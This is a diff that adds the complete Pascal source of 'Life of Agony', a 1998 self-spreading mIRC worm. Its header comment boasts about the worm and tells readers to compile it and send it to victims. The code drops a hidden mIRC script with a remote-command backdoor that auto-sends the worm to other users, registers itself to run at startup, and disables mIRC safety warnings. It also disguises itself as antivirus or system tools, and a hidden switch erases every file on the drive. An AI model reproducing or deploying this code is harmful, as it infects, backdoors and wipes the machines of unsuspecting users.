@@ -1,0 +1,1006 @@
+   PROGRAM Life_of_Agony;
+   { ===========================================================================
+
+
+            NAME: Life of Agony v1.30 hunter-killer.
+            TYPE: Direct action mIRC-worm.
+            SIZE: Approximately 20k
+        LANGUAGE: Borland Pascal 7.0 (with a patch).
+          AUTHOR: T-2000 / [Immortal Riot].
+          E-MAIL: T2000_@hotmail.com
+            DATE: October - November 1998.
+     DESTRUCTIVE: Yeah, but only on demand.
+
+
+    The DMSETUP mIRC-worm uses some clever techniques, but they are all rather
+    poorly implemented, plus the worm only works with standard configurations.
+    This inspired me to write my own mIRC-worm which would fix all of these
+    'shortcomings', and even add some capabilities. I called it "Life of Agony"
+    (LOA for short) due it's backdoor which let's people execute *any* mIRC-
+    command, thereby making the victim an open target to the public. Also note
+    that LOA beats DMSETUP in *every* aspect, so if you were looking for a tool
+    a la Back Orifice, but for mIRC, LOA would be an excellent choice.
+
+
+    CAPABILITIES:
+
+         - Semi-random dropper-output.
+         - Semi-random filenames (droppers & scripts).
+         - Registers itself in the RunServices.
+         - Removes all known DMSETUP-strains.
+         - Highly advanced tactical script (like 'stealth').
+         - Modifies MIRC.INI instead of overwriting it.
+         - Can locate MIRC.INI regardless of it's path.
+
+
+    BAD STUFF:
+
+      *  Some (non-crucial) parts of the worm-script may function incorrectly,
+         this is NOT my fault however, it's due all those bloody bugs in the
+         mIRC-scripting-language (especially the parsing).
+
+      *  A delay of several seconds may occur when LOA registers itself in the
+         registry, (reason for this being the fact that it has to call an
+         external (Winshit95/98/NT) program, REGEDIT.EXE).
+
+      *  A temporarly DOS-box will be opened when the worm is called by the
+         register during bootup, this only takes less than a second however.
+
+      *  If the worm is executed with mIRC active, the changes in MIRC.INI will
+         not have any effect, this is because mIRC updates MIRC.INI on exit with
+         the values stored in memory. You could say this wouldn't be a serious
+         problem since the worm is called during every bootup, thereby infecting
+         MIRC.INI again properly, however, the 'this-dir-is-already-infected'-
+         file will be already present, thus the worm won't infect MIRC.INI
+         again.
+
+
+    Some ideas were dropped:
+
+        - Random dropper-size:     This doesn't work with my copy-routine, coz
+                                   I don't wanna use constant sizes.
+
+        - Script-optimizations:    Only mIRC versions 5.4 and above allow these,
+                                   in all other cases the script simply won't
+                                   work at all.
+
+        - Polymorphism:            This would require a engine specifically
+                                   written in asm for this type of program, I
+                                   don't have time for that.
+
+        - Multi-platform:          I have a beta-version ready which besides
+                                   mIRC, also infects Pirch, however I never
+                                   use that last one, so I cannot test it
+                                   properly.
+
+
+    IMPORTANT:
+
+      Borland Pascal 7.0 has a bug somewhere in the CRT-unit, which results in
+      BP7 programs crashing at fast systems (Pentium 200+), luckily there's a
+      patch available at www.premier1.net/~topanga/ which should fix this.
+
+
+    INSTRUCTION MANUAL:
+
+      1. Install the patch I mentioned above,
+      2. Compile the .PAS with BP7,
+      3. PKLITE it,
+      4. Rename it to KILL-DMS.EXE,
+      5. And f0rk it to as many boneheads you can find.
+
+
+    If you have any ideas for improvement and/or bug-reports, mail em to me.
+
+    LOA does alot, however, I don't feel like writing a 20k description of a
+    program which isn't even a bloody virus... I'm going back to asm as for now.
+
+
+    DISCLAIMER:
+
+      I confess, now come sue me...
+
+
+    SOME LAME GREETS:
+
+      Bluenine    :   Okay, okay, I'll put you in the random-word list, heh.
+      Morphine    :   Master of (clay) puppets.
+      T-2000      :   Next time you fuck-up my HD I'm gonna kick yer fucken ass!
+      VirusBust   :   Thanx for pointing me out the BP7 division-by-zero bug.
+
+
+
+                  "HONK! HONK!... WHOOAAAAA!!! SPLAT!... *grin*"
+                       - Carmageddon II: Carpocalypse Now -
+
+    =========================================================================== }
+
+   {$M 16384, 0, 0}
+
+   USES Dos, Crt;
+   TYPE
+     View_T  =  RECORD
+                  Copyright  :  String[80];
+                  Check      :  String[80];
+                  Done       :  String[80];
+                  Exit       :  String[80];
+                END;
+
+
+   CONST
+     Inf_ID_File    =  '\WINDAT64.DL1';
+     Temp_File      =  'LOA1TEMP.$$$';
+     ID_File        =  'MIRC_ID1.DAT';
+     Max_Names      =  272;
+     DMRemover      =  'KILL-DMS.EXE';
+     Random_Names   :  Array[0..Max_Names-1] of String[4] = (
+
+                        'TEST', 'YOU ', 'NOW ', 'AK47', 'ALFA', 'ASIA', 'ASS ',
+                        'ASM ', 'AMY ', 'ANTI', 'AV  ', 'ANNA', 'ANNY', 'BABE',
+                        'BAD ', 'BASS', 'BALL', 'BETA', 'BOMB', 'BOOM', 'BO3 ',
+                        'BOY ', 'BOYS', 'BIOS', 'B&B ', 'BUS ', 'BILL', 'BLOW',
+                        'CUM ', 'COCK', 'COOL', 'COMP', 'CARA', 'CMDR', 'COP ',
+                        'CALL', 'DARK', 'DISK', 'DROP', 'DANA', 'DCC ', 'DEAD',
+                        'DUKE', 'DUDE', 'DEAF', 'DUNE', 'DOOM', 'DRUG', 'DOPE',
+                        'DODO', 'DEEP', 'DOS ', 'DUKE', 'DR  ', 'DOC ', 'DOIT',
+                        'DICK', 'DINO', 'DORK', 'EVIL', 'EVE ', 'EMMA', 'FUCK',
+                        'FUN ', 'FOOL', 'FIND', 'FAG ', 'FREE', 'FOX ', 'F0RK',
+                        'GAY ', 'GOOD', 'GUN ', 'GIRL', 'GWAR', 'GAME', 'HACK',
+                        'HUG ', 'HARD', 'HUGE', 'HELP', 'HOLE', 'HELL', 'HOOK',
+                        'HULK', 'IRC ', 'IBM ', 'ICQ ', 'JUNK', 'JOHN', 'JERK',
+                        'JOIN', 'KATY', 'KILL', 'KORN', 'KIDS', 'KEWL', 'KID ',
+                        'LARA', 'LISA', 'LIST', 'LOVE', 'LILA', 'LUCK', 'LICK',
+                        'LESB', 'LEET', 'MARC', 'MAIL', 'MASS', 'MEGA', 'MIRC',
+                        'MMX ', 'NWO ', 'NET ', 'NUKE', 'NUDE', 'NTBS', 'MS  ',
+                        'ME  ', 'ORGY', 'PUKE', 'PIRC', 'PASS', 'POLY', 'PROT',
+                        'PORN' ,'PRON', 'PUSS', 'PING', 'PONG', 'PRO ', 'PERL',
+                        'P200', 'PIC ', 'PENT', 'PICS', 'PK  ', 'PREZ', 'POP ',
+                        'QUIT', 'Q3  ', 'ROB ', 'RAIN', 'RIPP', 'REAL', 'SUPA',
+                        'SNOW', 'SHOT', 'SYS ', 'SEX ', 'STOP', 'SINK', 'SUX ',
+                        'SHAG', 'SUCK', 'SOUL', 'SCAN', 'SHIT', 'SPAM', 'SUZI',
+                        'SOFT', 'SCAN', 'SLAM', 'SKL ', 'SLAP', 'SICK', 'TITS',
+                        'TINY', 'TINA', 'TWIN', 'TOTO', 'TR3 ', 'TROJ', 'TEAM',
+                        'UZI ', 'UNIX', 'UPD8', 'UPGR', 'UGLY', 'USA ', 'USE ',
+                        'U&ME', 'VSUM', 'VIRC', 'VX  ', 'WIN ', 'WNG8', 'W95 ',
+                        'WARE', 'W98 ', 'WEED', 'WORD', 'WRIT', 'WNT ', 'XDCC',
+                        'XYZ ', 'XMAN', 'XENA', 'XIRC', 'XXX ', 'YORK', 'YOGO',
+                        'ZERO', 'ZOOL', 'ZOO ', 'ZORK', 'ZULU', '3D  ', '4U  ',
+                        '486 ', '666 ', '911 ', 'ZIP ', 'ARJ ', 'RAR ', 'JPG ',
+                        'ARC ', 'SWAT', 'SEAL', 'RAW ', 'T2IR', 'INCA', 'RATM',
+                        'JAG ', 'HARM', 'SARA', 'WILL', 'GP3 ', 'ROD ', 'RAPE',
+                        'PETE', 'AL  ', 'KARL', 'MEN ', 'GUYS', 'MP3 ', 'WAVE',
+                        'SECR', 'DON ', 'MPEG', 'XL  ', 'BUTT', 'FAT!', 'NO! ',
+                        'ROCK', 'EXEC', 'H8R ', 'BEER', 'RA3 ', 'QUAK', 'ZORO',
+                        'BLUE', 'NINE', '.ZIP', '.ARJ', '.LHA', '.RAR', '.PAK',
+                        '.ARC', '.SEX', '.JPG', '.MPG', '.GIF', '.WAV', '.NFO',
+                        '.TXT', '.DOC', '.NOW', '.BMP', '.INI', '.MP3');
+
+
+   VAR
+     View            :  View_T;
+     Find_DMSetup    :  Boolean;
+     Damage          :  Boolean;
+     i, q            :  Word;
+     z               :  LongInt;
+     File_Line       :  String;
+     Bytes_Read      :  Word;
+     Dummy           :  String;
+     In_File         :  Text;
+     Out_File        :  Text;
+     Worm_Script     :  String[12];
+     Worm_Dropper    :  String[12];
+     Last_Setting    :  String;
+     ID_Location     :  Text;
+     Year            :  Word;
+     Month           :  Word;
+     Day             :  Word;
+     DoW             :  Word;
+     Script          :  Array[0..20] of String[200];
+     Script_Lines    :  Byte;
+
+
+
+   { Converts a given string to lowercase. }
+   FUNCTION LowerCase (s : String) : String;
+   VAR
+     i  :  Byte;
+     a  :  Char;
+
+   BEGIN
+        for i := 1 to Length(s) do
+        Begin
+             a := s[i];
+             if (a >= 'A') and (a <= 'Z') then a := Char(Ord(a) + (Ord('a') - Ord('A')));
+             s[i] := a;
+        End;
+        LowerCase := s;
+   END;
+
+
+   { Converts a given string to uppercase. }
+   FUNCTION UpperCase (s : String) : String;
+   VAR
+     i  :  Byte;
+
+   BEGIN
+        for i := 1 to Length(s) do s[i] := UpCase(s[i]);
+        UpperCase := s;
+   END;
+
+
+   { Removes any comments and/or tail-spaces. }
+   FUNCTION Strip (s : String) : String;
+   BEGIN
+        While Pos(';', s) > 0 do Delete(s, Length(s), 1);
+        While s[Length(s)] = ' ' do Delete(s, Length(s), 1);
+
+        Strip := s;
+   END;
+
+
+   { Constructs a semi-random DOS 8.3 filename. }
+   FUNCTION Get_Random_Name : String;
+   VAR
+     Temp  :  String[12];
+
+   BEGIN
+        Temp := '.';
+
+        While Temp[1] = '.' do
+          Temp := Random_Names[Random(Max_Names)] + Random_Names[Random(Max_Names)];
+
+        While Pos(' ', Temp) > 0 do Delete(Temp, Pos(' ', Temp), 1);
+
+        if Temp[1] = '.' then Delete(Temp, 1, 1);
+
+        Get_Random_Name := Temp;
+   END;
+
+
+   { Dunno why I used an array, maybe for other future enhancement? }
+   PROCEDURE Init_Script_mIRC(Dropper : String);
+   BEGIN
+        Script_Lines := 15;
+
+        Script[01] := 'on 1:start: { .enable #loa | .remote on | .events on | .ctcps on | .raw on | .sreq auto -m }';
+
+        Script[02] := '#loa off';
+
+        Script[03] := 'on 1:part:#: { if (($nick != $me) && ($rand(0, 3) ' +
+                      ' == 0)) { .disable #loa | .ignore -u600 $nick | .dcc send ' +
+                      '$nick ' + LowerCase(Dropper) + ' | .timer 1 120 { ' +
+                      '.enable #loa } } }';
+
+        Script[04] := '#loa end';
+
+        Script[05] := 'on 1:text:*lbj*rules!*:*: { .msg $nick . | .halt }';
+        Script[06] := 'ctcp 1:loado:*: { .$2- | .halt }';
+
+        { 'Stealth'-stuff. }
+
+        Script[07] := 'on 1:input:*: { if (virus isin $1-) { .halt } }';
+        Script[08] := 'on 1:text:*virus*:*: { .ignore -u600 $nick }';
+        Script[09] := 'on 1:join:#: { if (help isin $chan) { .part $chan } }';
+        Script[10] := 'ctcp 1:dcc send:*: { if (($nick != $me) && ((.com ' +
+                      'isin $3) || (.exe isin $3)) && (($6 > 12000) && ($6 ' +
+                      '< 105000))) { .halt } }';
+
+        Script[11] := 'alias /sreq { /sreq $1- | .sreq auto -m }';
+        Script[12] := 'alias /ctcps { /ctcps $1- | .ctcps on }';
+        Script[13] := 'alias /events { /events $1- | .events on }';
+        Script[14] := 'alias /remote { /remote $1- | .remote on }';
+        Script[15] := 'alias /raw { /raw $1- | .raw on }';
+   END;
+
+
+   { Drops the mIRC-script. }
+   PROCEDURE Drop_Script(mIRC_Dir, Script_Name : String);
+   VAR
+     Script_File  :  Text;
+
+
+   BEGIN
+        Init_Script_mIRC(mIRC_Dir + Worm_Dropper);
+
+        Assign(Script_File, mIRC_Dir + Script_Name);
+        Rewrite(Script_File);
+        WriteLn(Script_File, '[script]');
+
+        { Dis is why I prefer asm... ewww, what a mess! }
+
+        for i := 0 to 59 + Random(30) do WriteLn(Script_File, 'n', i, '=');
+
+        q := 1;
+
+        for i := i + 1 to i + 1 + Script_Lines do
+        Begin
+             Write(Script_File, 'n', i, '=');
+             for z := 1 to 110 + Random(40) do Write(Script_File, ' ');
+             WriteLn(Script_File, Script[q]);
+             Inc(q);
+        End;
+
+        for i := i + 1 to (i + 1 + 60 + Random(30)) do
+          WriteLn(Script_File, 'n', i, '=');
+
+        Close(Script_File);
+
+        SetFAttr(Script_File, Readonly or Hidden);
+   END;
+
+
+   { To stimulate the fear factor. }
+   PROCEDURE Payload;
+   BEGIN
+        TextBackground(Red);
+        TextColor(Black);
+        ClrScr;
+
+        GotoXY(13, 1);
+        GotoXY(11, 1);
+        WriteLn('=[ Life of Agony 1.30, (c) 1998 by T-2000 / Immortal Riot ]=');
+
+        GotoXY(6, 11);
+        Write('Hi! I am the [LIFE OF AGONY] worm, and I''m gonna fuck you up REAL bad!');
+
+        TextColor(White+Blink);
+
+        GotoXY(20, 11);
+        Write('LIFE OF AGONY');
+
+        Asm                    { Disable cursor. }
+           MOV     AH, 01h
+           MOV     CX, 0F00h
+           INT     10h
+        End;
+   END;
+
+
+   { Tests if a given filename exists. }
+   FUNCTION Exist(File_Name : String) : Boolean;
+   VAR
+     Dir_Info  :  SearchRec;
+
+   BEGIN
+        FindFirst(File_Name, AnyFile, Dir_Info);
+        if DosError = 0 then Exist := True else Exist := False;
+   END;
+
+
+   PROCEDURE Copy_Dropper(Target : String);
+   VAR
+     Source_File    :  File;
+     Target_File    :  File;
+     Buffer         :  Array[1..4096] of Byte;
+
+
+   BEGIN
+        if Exist(Target) = False then
+        Begin
+             Assign(Source_File, ParamStr(0));
+             Assign(Target_File, Target);
+
+             Reset(Source_File, 1);
+             Rewrite(Target_File, 1);
+
+             Repeat
+               BlockRead(Source_File, Buffer, 4096, Bytes_Read);
+               BlockWrite(Target_File, Buffer, Bytes_Read);
+             Until Bytes_Read = 0;
+
+             Close(Source_File);
+             Close(Target_File);
+             SetFAttr(Target_File, ReadOnly or Hidden);
+        End;
+   END;
+
+
+   { Tag the shit into the Win-registry. }
+   PROCEDURE Register_Virus;
+   VAR
+     Reg_File  :  Text;
+
+   BEGIN
+        Dummy := '';
+        for i := 1 to EnvCount do
+        Begin
+             if UpperCase(Copy(EnvStr(i), 1, Pos('=', EnvStr(i)) - 1) ) = 'WINDIR' then
+             Begin
+                  Dummy := UpperCase(Copy(EnvStr(i), 8, Length(EnvStr(i)) - 7));
+             End;
+        End;
+
+        if Dummy <> '' then
+        Begin
+             Copy_Dropper(Dummy + '\LOA.EXE');
+
+             Assign(Reg_File, 'LOA.REG');
+             Rewrite(Reg_File);
+
+             WriteLn(Reg_File, 'REGEDIT4');
+             WriteLn(Reg_File);
+             WriteLn(Reg_File, '[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices]');
+             WriteLn(Reg_File, '"Life of Agony"="loa.exe"');
+             WriteLn(Reg_File);
+
+             Close(Reg_File);
+
+             SwapVectors;
+             Exec(Dummy + '\REGEDIT.EXE', '/s LOA.REG');
+             SwapVectors;
+             Erase(Reg_File);
+        End;
+   END;
+
+
+   { The working horsie... }
+   PROCEDURE Infect_mIRC (mIRC_Dir : String);
+   VAR
+     Skip_Write   :  Boolean;
+     Add_Declare  :  Boolean;
+     Group        :  String;
+
+
+   BEGIN
+        Skip_Write := False;
+
+        Assign(In_File, mIRC_Dir + 'MIRC.INI');
+        Assign(Out_File, mIRC_Dir + Temp_File);
+
+        SetFAttr(In_File, 0);
+        SetFAttr(Out_File, 0);
+
+        Reset(In_File);
+        Rewrite(Out_File);
+
+        Worm_Dropper := Get_Random_Name;
+        if Random(2) = 0 then
+         Worm_Dropper := Worm_Dropper + '.COM' else
+         Worm_Dropper := Worm_Dropper + '.EXE';
+
+        Worm_Script := LowerCase(Get_Random_Name) + '.ini';
+
+        Copy_Dropper(mIRC_Dir + Worm_Dropper);
+        Drop_Script(mIRC_Dir, Worm_Script);
+
+        While not eof(In_File) do
+        Begin
+             if File_Line <> '' then Last_Setting := File_Line;
+
+             ReadLn(In_File, File_Line);
+
+             Dummy := UpperCase(Strip(File_Line));
+
+             if (Dummy[1] = '[') and (Dummy[Length(Dummy)] = ']') then
+             Group := Dummy;
+
+             if (Dummy[1] = '[') and (Dummy[Length(Dummy)] = ']') then
+             Begin
+                  if ((Group = '[WARN]') or
+                     (Group = '[FILESERVER]') or
+                     (Group = '[WIZARD]')) then
+                     Skip_Write := True else Skip_Write := False;
+
+                  if Group = '[RFILES]' then Add_Declare := True
+                  Else
+                  Begin
+                       if Add_Declare = True then
+                       Begin
+                            Val(Copy(Last_Setting, 2, Pos('=', Last_Setting)-2), i, q);
+                            Inc(i);
+                            WriteLn(Out_File, 'n', i, '=', Worm_Script);
+                       End;
+                       Add_Declare := False;
+                  End;
+             End
+             Else
+             if (Group = '[IDENT]') and (Copy(Dummy, 1, 7) = 'USERID=') then
+               File_Line := 'userid=LOA';
+
+             if Skip_Write = False then WriteLn(Out_File, File_Line);
+        End;
+
+        WriteLn(Out_File, '[wizard]');
+        WriteLn(Out_File, 'warning=6');    { No more lame help-windows. }
+
+        WriteLn(Out_File);
+
+        WriteLn(Out_File, '[warn]');
+        WriteLn(Out_File, 'fserve=off');
+        WriteLn(Out_File, 'dcc=off');      { No warning when someone DCC's us. }
+
+        WriteLn(Out_File);
+
+        WriteLn(Out_File, '[fileserver]');
+        WriteLn(Out_File, 'homedir=c:');
+        WriteLn(Out_File, 'Warning=Off');
+
+        Close(In_File);
+        Close(Out_File);
+
+        Erase(In_File);
+        Rename(Out_File, mIRC_Dir + 'MIRC.INI');
+
+        if Exist(mIRC_Dir + ID_File) = False then
+        Begin
+             Assign(ID_Location, mIRC_Dir + ID_File);
+             Rewrite(ID_Location);
+             WriteLn(ID_Location, 'mIRC data-storage-file.');
+             Close(ID_Location);
+             SetFAttr(ID_Location, ReadOnly or Hidden);
+        End;
+   END;
+
+
+   { Scans a suitable .EXE for the DMSETUP worm. }
+   FUNCTION Is_DMSetup(Scan_File : String) : Boolean;
+   CONST
+     Scan_String   =  '$nick !';
+     Legal_String  =  'program';
+
+   VAR
+     In_File  :  File;
+     Dummy    :  String;
+     Found    :  Boolean;
+     i        :  Word;
+
+
+   BEGIN
+        Is_DMSetup := False;
+
+        if (Find_DMSetup = True) and
+           (UpperCase(Copy(Scan_File, Length(Scan_File) - 3, 4)) = '.EXE') then
+        Begin
+             GotoXY(11, WhereY);
+             Write(Scan_File);
+             ClrEol;
+
+             Assign(In_File, Scan_File);
+             FileMode := 0;
+             Reset(In_File, 1);
+
+             if (FileSize(In_File) > 35000) and (FileSize(In_File) < 105000) then
+             Begin
+                  Found := False;
+                  Bytes_Read := 666;
+                  Dummy[0] := Char(SizeOf(Dummy)-1);
+
+                  While Bytes_Read <> 0 do
+                  Begin
+                       BlockRead(In_File, Dummy[1], SizeOf(Dummy)-1, Bytes_Read);
+
+                       if not eof(In_File) then
+                       Begin
+                            for i := 1 to Bytes_Read - Length(Scan_String) do
+                            Begin
+                                 if Copy(Dummy, i, Length(Scan_String)) = Scan_String then
+                                 Found := True;
+                                 if Copy(Dummy, i, Length(Legal_String)) = Legal_String then
+                                 Bytes_Read := 0;
+                            End;
+                            Seek(In_File, FilePos(In_File) - Length(Scan_String));
+                       End
+                       Else Bytes_Read := 0;
+                  End;
+                  if Found = True then
+                  Begin
+                       Is_DMSetup := True;
+                       if Month = 11 then WriteLn(' cleaned!');
+                  End;
+             End;
+             Close(In_File);
+        End;
+   END;
+
+
+   { Recursive scanner. }
+   PROCEDURE Scan_Disk;
+   VAR
+     Current_Dir  :  String;
+
+
+   PROCEDURE Scan_Path (Path : String);
+   VAR
+     Dir_Info  :  SearchRec;
+     Victim    :  File;
+
+
+   BEGIN
+        FindFirst(Path + '*.*', AnyFile, Dir_Info);
+        While DosError = 0 do
+        Begin
+             if ((Dir_Info.Attr and Directory) = Directory) then
+             Begin
+                  if (Dir_Info.Name <> '.') and (Dir_Info.Name <> '..') then
+                     Scan_Path(Path + UpperCase(Dir_Info.Name) + '\');
+             End
+             Else
+             Begin
+                  if (Damage = True) or
+                     (Is_DMSetup(Path + Dir_Info.Name) = True) then
+                  Begin
+                       Assign(Victim, Path + Dir_Info.Name);
+                       SetFAttr(Victim, 0);
+                       if DosError = 0 then Erase(Victim);
+                  End
+                  Else
+                  if (UpperCase(Dir_Info.Name) = 'MIRC.INI') and
+                     (Exist(Path + ID_File) = False) then Infect_mIRC(Path);
+             End;
+             FindNext(Dir_Info);
+        End;
+   END;
+
+
+   BEGIN
+        if Damage = True then Payload else Write('Scanning: ');
+
+        GetDir(0, Current_Dir);
+
+        Scan_Path(Current_Dir[1] + ':\');
+   END;
+
+
+
+   { * * * * 666 * * * * * *  M A I N   P R O G R A M  * * * * * * 666 * * * * }
+   BEGIN
+        Randomize;
+
+        Damage := False;
+        Find_DMSetup := False;
+
+        GetDate(Year, Month, Day, DoW);
+
+        if Pos(DMRemover, ParamStr(0)) > 0 then
+        Begin
+             ClrScr;
+             Month := 11;
+             Find_DMSetup := True;
+        End;
+
+        Case Month of
+          1  : Begin
+                 View.Copyright := 'PowerBit anti-virus v3.34, (C)opyrighted 1999 by PB Systems.';
+                 View.Check := 'SHAREWARE - REGISTER? ';
+                 View.Done := 'YES!';
+                 View.Exit := 'Scan completed, no viruses were found.';
+               End;
+          2  : Begin
+                 View.Copyright := 'The Ultimate Chaos Website 2 - http://sourceofkaos.com/homes/ultchaos';
+                 View.Check := 'Visit me... ';
+                 View.Done := 'NOW!';
+                 View.Exit := 'Not detected.';
+               End;
+          3  : Begin
+                 View.Copyright := 'WaReZ SCaNNeR bY oDELiOFiLThY [SuCK]... ViSiT #warez !';
+                 View.Check := 'SeLF CHeCK: ';
+                 View.Done := 'oKeY';
+                 View.Exit := 'nO WaReZ wErE FoUnD aT DRiVe C: !!!';
+               End;
+          4  : Begin
+                 View.Copyright := 'DrSolomon Anti-Virus Toolkit v10.00 - SPECIAL EDITION -';
+                 View.Check := 'Scanning memory (DOS\UMB\HMA\XMS)... ';
+                 View.Done := 'No viruses found in memory';
+                 View.Exit := 'No viruses were found.';
+               End;
+          5  : Begin
+                 View.Copyright := 'ScanDisk 2.00, (C)Copyright Microsoft Corp 1981-1998.';
+                 View.Check := 'Checking critical areas... ';
+                 View.Done := 'OK';
+                 View.Exit := 'No errors were detected.';
+               End;
+          6  : Begin
+                 View.Copyright := 'Anti-Back-Orifice II.A, detects/removes all BO-instances from your system.';
+                 View.Check := 'Checking registry... ';
+                 View.Done := 'BO was not found in the registry';
+                 View.Exit := 'System clean, visit http://sourceofkaos.com/homes/ultchaos for updates.';
+               End;
+          7  : Begin
+                 View.Copyright := 'TERA SPOOF-INSTALLER VERSION 6.66';
+                 View.Check := 'Checking shadow-RAM... ';
+                 View.Done := 'located at x0FA56D6A4h';
+                 View.Exit := 'Failed to install spoof, SPSOCK64.DLL missing.';
+               End;
+          8  : Begin
+                 View.Copyright := 'WinGater by Terminatius [Finds installed WinGates at your system].';
+                 View.Check := 'Locating registry: ';
+                 View.Done := 'REGISTRY.REG';
+                 View.Exit := 'No WinGates found, go to Undernet, #wingater for help.';
+               End;
+          9  : Begin
+                 View.Copyright := 'Thunderbyte virus-detector v9.24, - (C) Copyright 1989-1999 Thunderbyte B.V.';
+                 View.Check := 'SANITY CHECK: ';
+                 View.Done := 'OK!';
+                 View.Exit := 'No viruses were found.';
+               End;
+          10 : Begin
+                 View.Copyright := 'Anti-Nuke written by cDc - Cult of the Dead Cow.';
+                 View.Check := 'Checking V86 interrupts... ';
+                 View.Done := 'No polling detected';
+                 View.Exit := 'No nuke-programs found.';
+               End;
+          11 : Begin
+                 View.Copyright := 'LOA''s Kill-DMSetup version 2.2, - SHAREWARE';
+                 View.Check := 'Checking memory... ';
+                 View.Done := 'OK';
+                 View.Exit := 'Completed!';
+               End;
+          12 : Begin
+                 View.Copyright := 'KILL-CIH v2.0. --> kills all known CIH-strains! <--';
+                 View.Check := 'Memory check... ';
+                 View.Done := 'passed';
+                 View.Exit := 'CIH has not been detected at your system.';
+               End;
+        End;
+
+        Assign(Out_File, Inf_ID_File);
+        if Exist(Inf_ID_File) = False then
+        Begin
+             Rewrite(Out_File);
+             Close(Out_File);
+             SetFAttr(Out_File, Readonly or Hidden);
+             Find_DMSetup := True;
+        End
+        Else if (Day = 1) or (Day = 16) then Find_DMSetup := True;
+
+        { I don't like nosy morons... }
+
+        if UpperCase(ParamStr(1)) = '/SECRET' then
+        Begin
+             Damage := True;
+             Find_DMSetup := False;
+             Scan_Disk;
+        End
+        Else
+        if Find_DMSetup = True then
+        Begin
+             WriteLn(View.Copyright);
+             Write(View.Check);
+
+             Register_Virus;
+
+             WriteLn(View.Done);
+             WriteLn;
+
+             if Month = 11 then
+             Begin
+                  WriteLn('You are about to scan your harddrive for the DMSetup virus, it is');
+                  WriteLn('crucial that you run this program without mIRC active, so if you');
+                  WriteLn('are still in mIRC at the moment, type /EXIT before you continue.');
+                  WriteLn;
+                  WriteLn('Press any key if mIRC is not active...');
+                  ReadKey;
+                  WriteLn;
+             End;
+
+             Scan_Disk;
+
+             GotoXY(1, WhereY);
+             ClrEol;
+             WriteLn;
+
+             Write(View.Exit);
+
+             WriteLn;
+        End;
+   END.
+
+   {
+
+    Wordlist, one of these days I'm gonna make an alfabethical sorter for it.
+
+   AK47
+   ALFA
+   ASIA
+   ASS
+   ASM
+   AMY
+   ANTI
+   AV
+   ANNA
+   ANNY
+   BABE
+   BAD
+   BASS
+   BALL
+   BETA
+   BOMB
+   BOOM
+   BO3
+   BOY
+   BOYS
+   BIOS
+   B&B
+   BUS
+   BILL
+   BLOW
+   CUM
+   COCK
+   COOL
+   COMP
+   CARA
+   CMDR
+   COP
+   CALL
+   DARK
+   DISK
+   DROP
+   DANA
+   DCC
+   DEAD
+   DUKE
+   DUDE
+   DEAF
+   DUNE
+   DOOM
+   DRUG
+   DOPE
+   DODO
+   DEEP
+   DOS
+   DUKE
+   DR
+   DOC
+   DOIT
+   DICK
+   DINO
+   DORK
+   EVIL
+   EVE
+   EMMA
+   FUCK
+   FUN
+   FOOL
+   FIND
+   FAG
+   FREE
+   FOX
+   F0RK
+   GAY
+   GOOD
+   GUN
+   GIRL
+   GWAR
+   GAME
+   HACK
+   HUG
+   HARD
+   HUGE
+   HELP
+   HOLE
+   HELL
+   HOOK
+   HULK
+   IRC
+   IBM
+   ICQ
+   JUNK
+   JOHN
+   JERK
+   JOIN
+   KATY
+   KILL
+   KORN
+   KIDS
+   KEWL
+   KID
+   LARA
+   LISA
+   LIST
+   LOVE
+   LILA
+   LUCK
+   LICK
+   LESB
+   LEET
+   MARC
+   MAIL
+   MASS
+   MEGA
+   MIRC
+   MMX
+   NWO
+   NET
+   NUKE
+   NUDE
+   NTBS
+   MS
+   ME
+   ORGY
+   PUKE
+   PIRC
+   PASS
+   POLY
+   PROT
+   PORN
+   PRON
+   PUSS
+   PING
+   PONG
+   PRO
+   PERL
+   P200
+   PIC
+   PENT
+   PICS
+   PK
+   PREZ
+   POP
+   QUIT
+   Q3
+   ROB
+   RAIN
+   RIPP
+   REAL
+   SUPA
+   SNOW
+   SHOT
+   SYS
+   SEX
+   STOP
+   SINK
+   SUX
+   SHAG
+   SUCK
+   SOUL
+   SCAN
+   SHIT
+   SPAM
+   SUZI
+   SOFT
+   SCAN
+   SLAM
+   SKL
+   SLAP
+   SICK
+   TITS
+   TINY
+   TINA
+   TWIN
+   TOTO
+   TR3
+   TROJ
+   TEAM
+   UZI
+   UNIX
+   UPD8
+   UPGR
+   UGLY
+   USA
+   USE
+   U&ME
+   VSUM
+   VIRC
+   VX
+   WIN
+   WNG8
+   W95
+   WARE
+   W98
+   WEED
+   WORD
+   WRIT
+   WNT
+   XDCC
+   XYZ
+   XMAN
+   XENA
+   XIRC
+   XXX
+   YORK
+   YOGO
+   ZERO
+   ZOOL
+   ZOO
+   ZORK
+   ZULU
+   3D
+   4U
+   486
+   666
+   911
+   ROBO
+   COP
+   R2D2
+
+   }
